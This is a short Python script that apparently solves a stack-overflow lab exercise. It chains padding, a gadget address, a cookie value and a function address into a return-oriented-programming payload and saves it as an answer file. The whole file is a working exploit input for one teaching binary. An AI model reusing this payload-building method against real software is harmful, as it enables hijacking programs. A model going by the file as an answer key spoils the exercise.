import struct

padding = b"A" * 16

gadget_addr = struct.pack("<Q", 0x4012c7)
cookie = struct.pack("<Q", 0x3f8)
func2_start = struct.pack("<Q", 0x401216)
payload = padding + gadget_addr + cookie + func2_start

with open("ans2_2.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans2_2.txt")